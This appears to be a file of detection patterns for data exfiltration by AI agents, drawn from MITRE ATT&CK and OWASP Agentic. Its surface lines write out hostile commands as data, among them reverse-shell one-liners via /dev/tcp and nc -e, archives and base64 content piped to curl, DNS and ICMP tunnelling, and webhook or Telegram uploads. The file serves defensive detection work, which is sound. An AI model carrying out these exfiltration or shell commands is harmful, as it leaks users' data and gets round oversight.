description: 25 new CHANNEL patterns for data exfiltration drawn from MITRE T1041, T1567, T1071, T1048, T1572 and OWASP Agentic A04. Seed half of 50; second batch is Janya's.

patterns.source: MITRE ATT&CK T1567.001, OWASP Agentic 2026 A04
patterns.rationale: Agent posts data to a paste/webhook service
patterns.L1_intent: Agent transmitting in-memory or file content to a third-party service that publicly hosts whatever it receives
patterns.L2_mechanism: Agent issuing HTTP POST requests with payload bodies to free public paste or webhook services that retain submitted content
patterns.L3_surface: POSTs to pastebin.com/api, hastebin.com/documents, ix.io, sprunge.us, transfer.sh, webhook.site/UUID, requestbin.com endpoints

patterns.rationale: Agent posts data to a Discord webhook URL
patterns.L1_intent: Agent transmitting collected data to a chat-platform webhook endpoint outside the user's organization
patterns.L2_mechanism: Agent issuing HTTPS POST requests to a chat-platform's incoming webhook URL with payload content drawn from local data
patterns.L3_surface: POSTs to discord.com/api/webhooks/, discordapp.com/api/webhooks/, hooks.slack.com/services/, outlook.office.com/webhook/

patterns.rationale: Agent uses Telegram bot API to send collected data
patterns.L1_intent: Agent transmitting collected data via a messaging-platform bot API outside the user's organization
patterns.L2_mechanism: Agent issuing requests against a messaging-bot API endpoint authenticated with a bot token to deliver content to a chat ID
patterns.L3_surface: Calls to api.telegram.org/bot<TOKEN>/sendMessage, sendDocument, or signal-cli REST endpoints with chat_id parameter

patterns.rationale: Agent uploads data to an external object-storage bucket
patterns.L1_intent: Agent uploading collected data to an externally-hosted object-storage bucket not part of the user's organization
patterns.L2_mechanism: Agent invoking object-storage upload primitives against bucket endpoints whose ownership is not the user's organization
patterns.L3_surface: aws s3 cp to s3://*-public buckets, gsutil cp to non-org buckets, az storage blob upload to non-org accounts, mc cp to non-org minio endpoints

patterns.rationale: Agent pushes a branch or commit to a remote not in the project's expected remotes
patterns.L1_intent: Agent pushing version-control content to a remote repository not part of the project's declared remotes
patterns.L2_mechanism: Agent invoking version-control push primitives against URLs not registered as the project's authorized origins
patterns.L3_surface: git push to URLs not in the repo's existing remote set, git remote add of new origins followed by push, hg push to non-default paths

patterns.rationale: Agent creates a gist or snippet on a code-sharing platform
patterns.L1_intent: Agent publishing content to a code-sharing platform's snippet feature outside any user-stated publication task
patterns.L2_mechanism: Agent invoking the snippet-creation API of a code-sharing platform to publish in-memory or file content
patterns.L3_surface: POSTs to api.github.com/gists, gitlab.com/api/v4/snippets, gitea/api/v1/users/*/gists with payload content

patterns.rationale: Agent sends email containing in-memory data via SMTP
patterns.L1_intent: Agent exfiltrating collected local data, file contents, or personal records by emailing them to an external recipient outside the user's organization or stated task, using email as an unauthorized data-exfiltration channel
patterns.L2_mechanism: Agent invoking SMTP-client primitives to send messages with local-data attachments to recipients outside the user's domain
patterns.L3_surface: smtplib.SMTP, sendmail, mailx, mutt -s with attachments, msmtp invocations targeting external SMTP servers and external To: addresses

patterns.rationale: Agent sends email via mail-provider API such as SendGrid
patterns.L1_intent: Agent sending an email message via a transactional-email provider API not part of the user's normal workflow
patterns.L2_mechanism: Agent invoking the REST API of a third-party email-delivery provider with payload content drawn from local data
patterns.L3_surface: POSTs to api.sendgrid.com/v3/mail/send, api.mailgun.net/v3/messages, api.postmark.com, api.resend.com with attachments or html body

patterns.rationale: Agent encodes data in DNS query labels
patterns.L1_intent: Agent encoding in-memory or file content into DNS query names whose labels carry the encoded payload
patterns.L2_mechanism: Agent constructing repeated DNS lookups whose query strings contain encoded chunks of file or memory content
patterns.L3_surface: Repeated dig/nslookup invocations with subdomain labels containing base32 or hex-encoded chunks pointing at the same authoritative zone

patterns.rationale: Agent uses ICMP echo payload as data carrier
patterns.L1_intent: Agent using a non-standard network protocol to carry payload content out of the host
patterns.L2_mechanism: Agent invoking primitives that emit packets of a non-standard protocol containing user-data payload
patterns.L3_surface: Use of hping3, scapy custom IP/ICMP payloads, ptunnel, iodine invocations with file content piped into the data field

patterns.rationale: Agent embeds data into media file before upload
patterns.L1_intent: Agent embedding sensitive content inside an apparently-benign media file before transmitting the file outward
patterns.L2_mechanism: Agent invoking steganography primitives to embed bytes into image, audio, or video files prior to network transmission
patterns.L3_surface: Sequence of steghide embed, exiftool -*=, openstego -embed, or LSB-encoding scripts followed by upload to a remote service

patterns.rationale: Agent uploads data to IPFS or chain-anchored storage
patterns.L1_intent: Agent uploading content to a decentralized or content-addressed storage network for later retrieval
patterns.L2_mechanism: Agent invoking the publication primitives of a content-addressed network to make collected data retrievable by hash
patterns.L3_surface: ipfs add, ipfs pin remote add, w3 up, calls to api.web3.storage, arweave deploy, or pinata.cloud upload endpoints

patterns.rationale: Agent opens an outbound TCP connection on a non-standard port
patterns.L1_intent: Agent opening an outbound network connection on a port unrelated to any standard application protocol the user requested
patterns.L2_mechanism: Agent invoking socket-creation primitives to connect to a remote host on a port not associated with the user-stated task
patterns.L3_surface: nc, ncat, openssl s_client, socat connections to non-standard high ports (4444, 1337, 8443, etc.) on unrelated remote hosts

patterns.rationale: Agent initiates outbound connection that exposes a shell or command channel
patterns.L1_intent: Agent establishing an outbound network connection that, once established, accepts and executes commands from the remote endpoint
patterns.L2_mechanism: Agent connecting outbound and binding the connection's I/O to a shell process so the remote side issues commands
patterns.L3_surface: bash -i >& /dev/tcp/HOST/PORT 0>&1, nc HOST PORT -e /bin/sh, python -c 'socket... pty.spawn', powershell -nop -c with TcpClient

patterns.rationale: Agent uses a sync tool to copy a directory to external storage
patterns.L1_intent: Agent using a directory-sync tool to mirror local files to a remote storage account outside the user's organization
patterns.L2_mechanism: Agent invoking a sync utility configured against a remote storage backend not part of the user's project
patterns.L3_surface: rclone copy, restic backup, syncthing, aws s3 sync, gsutil rsync against destinations not declared in the project

patterns.rationale: Agent archives directory then immediately posts the archive
patterns.L1_intent: Agent creating an archive of multiple files and immediately transmitting the archive to a remote network destination
patterns.L2_mechanism: Agent sequencing an archive-creation step with a network-upload step targeting an external host
patterns.L3_surface: tar czf - DIR | curl --data-binary @-, zip -r out.zip DIR && curl -F file=@out.zip, 7z a then upload via http

patterns.rationale: Agent base64-encodes content and posts via curl
patterns.L1_intent: Agent encoding file content into a transport-friendly representation and POSTing it to a remote endpoint
patterns.L2_mechanism: Agent passing file contents through an encoding pipeline and using a network-transfer client to POST the encoded bytes
patterns.L3_surface: base64 file | curl -X POST -d @-, openssl enc -base64 piped to wget --post-data, or python requests.post with b64encode body

patterns.rationale: Agent writes data to clipboard then opens a URL that auto-pastes
patterns.L1_intent: Agent writing local content to the system clipboard and opening a UI flow that consumes the clipboard contents
patterns.L2_mechanism: Agent populating the clipboard with collected data then triggering a UI primitive that uses clipboard contents in an outbound action
patterns.L3_surface: xclip -selection clipboard / pbcopy / clip.exe followed by open/start/xdg-open of a URL that has a paste-on-load handler

patterns.rationale: Agent emits a data: URL that the client will render and exfiltrate via subresources
patterns.L1_intent: Agent emitting a response containing a data URL that triggers the client to make outbound network requests carrying secret material
patterns.L2_mechanism: Agent producing output that the rendering client interprets as an embedded document with subresource references containing payload
patterns.L3_surface: data: URLs in agent output containing inline HTML with or

patterns.rationale: Agent uploads files via SMB or WebDAV to remote share
patterns.L1_intent: Agent transmitting files to a remote network share not declared as part of the user's workspace
patterns.L2_mechanism: Agent invoking file-share-protocol clients to copy files to a remote SMB or WebDAV path
patterns.L3_surface: smbclient //HOST/SHARE put, mount.cifs followed by cp, davfs2 mounts, curl -T against http://*/webdav/ paths

patterns.rationale: Agent commits sensitive content to a public branch
patterns.L1_intent: Agent committing collected content to a branch or repository that is or will become publicly readable
patterns.L2_mechanism: Agent creating commits in repositories whose visibility is public or whose branch is consumed by a public-publishing platform
patterns.L3_surface: git push of new content to gh-pages branch, github.io repos, public repos with new commits containing files outside any prior content

patterns.rationale: Agent submits a form to a third-party endpoint with collected data
patterns.L1_intent: Agent submitting form-encoded data to a third-party HTTP endpoint not part of the user's stated task
patterns.L2_mechanism: Agent issuing form-encoded HTTP POSTs with body content drawn from local files or in-memory state
patterns.L3_surface: curl --data-urlencode, requests.post with files= or data= dict to forms.google.com, formspree.io, formcarry.com, getform.io

patterns.rationale: Agent opens outbound websocket and streams data
patterns.L1_intent: Agent opening a long-lived outbound websocket and streaming collected data through it
patterns.L2_mechanism: Agent invoking a websocket client to connect to a remote endpoint and emit messages containing local data
patterns.L3_surface: websocat, wscat, python websockets.connect, node ws.WebSocket calls to wss:// or ws:// URLs not declared in user task

patterns.rationale: Agent calls a GraphQL mutation that uploads data
patterns.L1_intent: Agent submitting a structured-query mutation against an external API endpoint with payload drawn from local data
patterns.L2_mechanism: Agent issuing GraphQL mutation requests with variables containing in-memory or file-derived secret material
patterns.L3_surface: POSTs to /graphql endpoints with mutation { uploadFile(content: $...) } where $... is sourced from local files

patterns.rationale: Agent encodes data in headers, query strings, or path of seemingly benign request
patterns.L1_intent: Agent encoding sensitive data into HTTP request metadata of an apparently-routine outbound request
patterns.L2_mechanism: Agent placing collected payload inside HTTP headers, URL query parameters, or path segments of a request whose body looks ordinary
patterns.L3_surface: curl -H 'X-Token: SECRET' to logging or analytics endpoints, GET requests with secret data in ?q=, /track/SECRET path segments
